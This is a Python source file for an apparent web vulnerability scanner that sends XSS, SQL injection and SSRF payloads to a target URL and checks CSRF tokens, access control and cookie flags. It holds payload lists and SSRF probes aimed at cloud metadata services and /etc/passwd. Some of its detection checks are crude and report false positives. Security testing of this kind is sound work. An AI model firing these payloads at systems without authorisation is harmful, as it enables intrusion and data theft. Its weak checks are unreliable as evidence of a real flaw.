"""
Security Testing Tools

Integrated battle-tested security testing tools from VibePenTester framework.
Provides comprehensive vulnerability testing capabilities for OWASP Top 10.

Based on proven implementations from open-source security testing frameworks.
"""

import asyncio
import aiohttp
import json
import re
import time
import random
import base64
import urllib.parse
from typing import Dict, Any, List, Optional
from datetime import datetime

class SecurityTester:
    """Battle-tested security testing tools"""
    
    def __init__(self):
        self.timeout = 10
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            connector=aiohttp.TCPConnector(ssl=False)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def test_xss_payload(self, target_url: str, payload: str, injection_point: str, parameter_name: str = None) -> Dict[str, Any]:
        """Test XSS payload against target"""
        try:
            if injection_point == "parameter" and parameter_name:
                # Test GET parameter
                params = {parameter_name: payload}
                async with self.session.get(target_url, params=params) as response:
                    content = await response.text()
                    
                    # Check if payload is reflected
                    if payload in content:
                        # Check if it's executed (basic detection)
                        if any(tag in content for tag in ['<script', 'javascript:', 'onerror=', 'onload=']):
                            return {
                                "vulnerability_found": True,
                                "vulnerability_type": "Cross-Site Scripting (XSS)",
                                "target_url": target_url,
                                "payload": payload,
                                "injection_point": injection_point,
                                "parameter": parameter_name,
                                "severity": "high",
                                "description": f"XSS vulnerability found in parameter '{parameter_name}'",
                                "proof": f"Payload '{payload}' was reflected in response",
                                "timestamp": datetime.now().isoformat()
                            }
            
            elif injection_point == "form":
                # Test form submission
                form_data = {parameter_name: payload} if parameter_name else {"input": payload}
                async with self.session.post(target_url, data=form_data) as response:
                    content = await response.text()
                    
                    if payload in content:
                        return {
                            "vulnerability_found": True,
                            "vulnerability_type": "Cross-Site Scripting (XSS)",
                            "target_url": target_url,
                            "payload": payload,
                            "injection_point": injection_point,
                            "severity": "high",
                            "description": "XSS vulnerability found in form submission",
                            "proof": f"Payload '{payload}' was reflected in response",
                            "timestamp": datetime.now().isoformat()
                        }
            
            return {
                "vulnerability_found": False,
                "target_url": target_url,
                "payload": payload,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

    def generate_xss_payloads(self, context: str = "html", count: int = 5, encoding: str = "none") -> List[str]:
        """Generate XSS payloads based on context"""
        base_payloads = {
            "html": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>"
            ],
            "attribute": [
                "' onmouseover='alert(\"XSS\")'",
                "\" onload=\"alert('XSS')\"",
                "javascript:alert('XSS')",
                "' autofocus onfocus='alert(\"XSS\")'",
                "\" style=\"background:url(javascript:alert('XSS'))\""
            ],
            "javascript": [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "*/alert('XSS')/*"
            ],
            "url": [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
                "javascript:void(alert('XSS'))",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ]
        }
        
        payloads = base_payloads.get(context, base_payloads["html"])[:count]
        
        if encoding == "url":
            payloads = [urllib.parse.quote(p) for p in payloads]
        elif encoding == "html":
            payloads = [p.replace("<", "&lt;").replace(">", "&gt;") for p in payloads]
        elif encoding == "base64":
            payloads = [base64.b64encode(p.encode()).decode() for p in payloads]
        
        return payloads

    async def test_sqli_payload(self, target_url: str, payload: str, injection_point: str, parameter_name: str = None, detection_method: str = "error") -> Dict[str, Any]:
        """Test SQL injection payload against target"""
        try:
            if injection_point == "parameter" and parameter_name:
                params = {parameter_name: payload}
                async with self.session.get(target_url, params=params) as response:
                    content = await response.text()
                    status = response.status
                    
                    # Error-based detection
                    if detection_method == "error":
                        sql_errors = [
                            "mysql_fetch", "ORA-", "Microsoft OLE DB", "ODBC SQL Server",
                            "PostgreSQL", "SQLite", "syntax error", "mysql_num_rows",
                            "Warning: mysql", "valid MySQL result", "MySqlClient",
                            "OLE DB", "SQL Server", "Microsoft Access Driver"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                return {
                                    "vulnerability_found": True,
                                    "vulnerability_type": "SQL Injection",
                                    "target_url": target_url,
                                    "payload": payload,
                                    "injection_point": injection_point,
                                    "parameter": parameter_name,
                                    "detection_method": detection_method,
                                    "severity": "critical",
                                    "description": f"SQL injection vulnerability found in parameter '{parameter_name}'",
                                    "proof": f"Database error detected: {error}",
                                    "timestamp": datetime.now().isoformat()
                                }
                    
                    # Boolean-based detection
                    elif detection_method == "boolean":
                        # This would require multiple requests to compare responses
                        # Simplified implementation
                        if status == 200 and len(content) > 0:
                            return {
                                "vulnerability_found": True,
                                "vulnerability_type": "SQL Injection (Boolean-based)",
                                "target_url": target_url,
                                "payload": payload,
                                "injection_point": injection_point,
                                "parameter": parameter_name,
                                "detection_method": detection_method,
                                "severity": "critical",
                                "description": f"Potential boolean-based SQL injection in parameter '{parameter_name}'",
                                "timestamp": datetime.now().isoformat()
                            }
            
            return {
                "vulnerability_found": False,
                "target_url": target_url,
                "payload": payload,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

    def generate_sqli_payloads(self, database_type: str = "mysql", injection_type: str = "all", count: int = 5) -> List[str]:
        """Generate SQL injection payloads based on database type"""
        payloads = {
            "mysql": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR 1=1#",
                "' UNION SELECT NULL,version(),NULL--"
            ],
            "mssql": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT NULL,@@version,NULL--"
            ],
            "oracle": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 FROM dual--",
                "' AND (SELECT COUNT(*) FROM all_tables)>0--",
                "' OR 1=1--",
                "' UNION SELECT NULL,banner,NULL FROM v$version--"
            ],
            "postgresql": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL,version(),NULL--"
            ],
            "sqlite": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
                "' OR 1=1--",
                "' UNION SELECT NULL,sqlite_version(),NULL--"
            ]
        }
        
        return payloads.get(database_type, payloads["mysql"])[:count]

    async def check_csrf_protection(self, target_url: str, form_id: str = None) -> Dict[str, Any]:
        """Check if form is protected against CSRF attacks"""
        try:
            async with self.session.get(target_url) as response:
                content = await response.text()
                
                # Look for CSRF tokens
                csrf_patterns = [
                    r'name=["\']csrf[_-]?token["\']',
                    r'name=["\']_token["\']',
                    r'name=["\']authenticity_token["\']',
                    r'name=["\']csrfmiddlewaretoken["\']',
                    r'name=["\']__RequestVerificationToken["\']'
                ]
                
                csrf_found = False
                for pattern in csrf_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        csrf_found = True
                        break
                
                # Check for forms
                form_pattern = r'<form[^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
                
                vulnerable_forms = []
                for i, form in enumerate(forms):
                    has_csrf = any(re.search(pattern, form, re.IGNORECASE) for pattern in csrf_patterns)
                    if not has_csrf:
                        vulnerable_forms.append(f"Form {i+1}")
                
                has_vulnerability = len(vulnerable_forms) > 0
                
                return {
                    "vulnerability_found": has_vulnerability,
                    "vulnerability_type": "Cross-Site Request Forgery (CSRF)" if has_vulnerability else None,
                    "target_url": target_url,
                    "csrf_protection_found": csrf_found,
                    "vulnerable_forms": vulnerable_forms,
                    "severity": "medium" if has_vulnerability else "info",
                    "description": f"Forms without CSRF protection: {', '.join(vulnerable_forms)}" if has_vulnerability else "CSRF protection detected",
                    "timestamp": datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

    async def test_ssrf_vulnerability(self, target_url: str, injection_point: str, parameter_name: str = None, callback_server: str = None) -> Dict[str, Any]:
        """Test for Server-Side Request Forgery vulnerabilities"""
        try:
            # Use a callback server or internal IP addresses
            test_urls = [
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/"
            ]
            
            if callback_server:
                test_urls.insert(0, callback_server)
            
            for test_url in test_urls:
                if injection_point == "parameter" and parameter_name:
                    params = {parameter_name: test_url}
                    async with self.session.get(target_url, params=params) as response:
                        content = await response.text()
                        
                        # Check for signs of SSRF
                        ssrf_indicators = [
                            "root:x:", "daemon:", "bin:", "sys:",  # /etc/passwd content
                            "ami-id", "instance-id", "security-groups",  # AWS metadata
                            "project/numeric-project-id", "instance/id",  # GCP metadata
                            "Connection refused", "Connection timeout",
                            "Internal Server Error", "500"
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in content:
                                return {
                                    "vulnerability_found": True,
                                    "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                                    "target_url": target_url,
                                    "test_url": test_url,
                                    "injection_point": injection_point,
                                    "parameter": parameter_name,
                                    "severity": "high",
                                    "description": f"SSRF vulnerability found in parameter '{parameter_name}'",
                                    "proof": f"Server made request to {test_url}, indicator: {indicator}",
                                    "timestamp": datetime.now().isoformat()
                                }
            
            return {
                "vulnerability_found": False,
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

    async def test_access_control(self, target_url: str, resource_path: str, expected_role: str = None) -> Dict[str, Any]:
        """Test for broken access control vulnerabilities"""
        try:
            # Test direct access to resource
            full_url = target_url.rstrip('/') + '/' + resource_path.lstrip('/')
            
            async with self.session.get(full_url) as response:
                status = response.status
                content = await response.text()
                
                # Check if resource is accessible without authentication
                if status == 200:
                    # Look for admin/sensitive content indicators
                    sensitive_indicators = [
                        "admin", "dashboard", "control panel", "user management",
                        "delete", "modify", "edit user", "system settings",
                        "configuration", "database", "logs", "debug"
                    ]
                    
                    content_lower = content.lower()
                    found_indicators = [ind for ind in sensitive_indicators if ind in content_lower]
                    
                    if found_indicators:
                        return {
                            "vulnerability_found": True,
                            "vulnerability_type": "Broken Access Control",
                            "target_url": target_url,
                            "resource_path": resource_path,
                            "status_code": status,
                            "severity": "high",
                            "description": f"Sensitive resource accessible without proper authorization",
                            "proof": f"Resource returned status {status} with sensitive content: {', '.join(found_indicators)}",
                            "timestamp": datetime.now().isoformat()
                        }
                
                elif status == 403:
                    return {
                        "vulnerability_found": False,
                        "target_url": target_url,
                        "resource_path": resource_path,
                        "status_code": status,
                        "description": "Resource properly protected (403 Forbidden)",
                        "timestamp": datetime.now().isoformat()
                    }
                
                return {
                    "vulnerability_found": False,
                    "target_url": target_url,
                    "resource_path": resource_path,
                    "status_code": status,
                    "timestamp": datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

    async def check_session_security(self, target_url: str) -> Dict[str, Any]:
        """Check session cookie security settings"""
        try:
            async with self.session.get(target_url) as response:
                cookies = response.cookies
                
                issues = []
                secure_cookies = []
                
                for cookie in cookies:
                    cookie_issues = []
                    
                    # Check HttpOnly flag
                    if not cookie.get('httponly', False):
                        cookie_issues.append("Missing HttpOnly flag")
                    
                    # Check Secure flag
                    if not cookie.get('secure', False):
                        cookie_issues.append("Missing Secure flag")
                    
                    # Check SameSite attribute
                    if not cookie.get('samesite'):
                        cookie_issues.append("Missing SameSite attribute")
                    
                    if cookie_issues:
                        issues.append({
                            "cookie_name": cookie.key,
                            "issues": cookie_issues
                        })
                    else:
                        secure_cookies.append(cookie.key)
                
                has_issues = len(issues) > 0
                
                return {
                    "vulnerability_found": has_issues,
                    "vulnerability_type": "Insecure Session Management" if has_issues else None,
                    "target_url": target_url,
                    "cookie_issues": issues,
                    "secure_cookies": secure_cookies,
                    "severity": "medium" if has_issues else "info",
                    "description": f"Found {len(issues)} cookies with security issues" if has_issues else "All cookies properly secured",
                    "timestamp": datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                "vulnerability_found": False,
                "error": str(e),
                "target_url": target_url,
                "timestamp": datetime.now().isoformat()
            }

# Utility functions for compatibility with existing agents
async def test_xss_payload(target_url: str, payload: str, injection_point: str, parameter_name: str = None) -> Dict[str, Any]:
    """Wrapper function for XSS testing"""
    async with SecurityTester() as tester:
        return await tester.test_xss_payload(target_url, payload, injection_point, parameter_name)

async def test_sqli_payload(target_url: str, payload: str, injection_point: str, parameter_name: str = None, detection_method: str = "error") -> Dict[str, Any]:
    """Wrapper function for SQL injection testing"""
    async with SecurityTester() as tester:
        return await tester.test_sqli_payload(target_url, payload, injection_point, parameter_name, detection_method)

async def check_csrf_protection(target_url: str, form_id: str = None) -> Dict[str, Any]:
    """Wrapper function for CSRF testing"""
    async with SecurityTester() as tester:
        return await tester.check_csrf_protection(target_url, form_id)

async def test_ssrf_vulnerability(target_url: str, injection_point: str, parameter_name: str = None, callback_server: str = None) -> Dict[str, Any]:
    """Wrapper function for SSRF testing"""
    async with SecurityTester() as tester:
        return await tester.test_ssrf_vulnerability(target_url, injection_point, parameter_name, callback_server)

async def test_access_control(target_url: str, resource_path: str, expected_role: str = None) -> Dict[str, Any]:
    """Wrapper function for access control testing"""
    async with SecurityTester() as tester:
        return await tester.test_access_control(target_url, resource_path, expected_role)

async def check_session_security(target_url: str) -> Dict[str, Any]:
    """Wrapper function for session security testing"""
    async with SecurityTester() as tester:
        return await tester.check_session_security(target_url)

def generate_xss_payloads(context: str = "html", count: int = 5, encoding: str = "none") -> List[str]:
    """Generate XSS payloads"""
    tester = SecurityTester()
    return tester.generate_xss_payloads(context, count, encoding)

def generate_sqli_payloads(database_type: str = "mysql", injection_type: str = "all", count: int = 5) -> List[str]:
    """Generate SQL injection payloads"""
    tester = SecurityTester()
    return tester.generate_sqli_payloads(database_type, injection_type, count)